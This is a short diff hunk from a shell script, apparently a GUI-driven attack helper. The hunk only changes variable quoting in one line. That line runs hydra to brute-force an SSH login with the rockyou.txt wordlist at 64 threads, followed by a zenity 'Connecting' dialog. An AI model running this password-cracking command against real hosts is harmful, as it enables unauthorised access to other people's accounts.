@@ -137,7 +137,7 @@ else
                         Hercules
                     else
                         # Crack SSH password
-                        hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host"
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="Connecting to ${user}. Please wait..."
                         zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
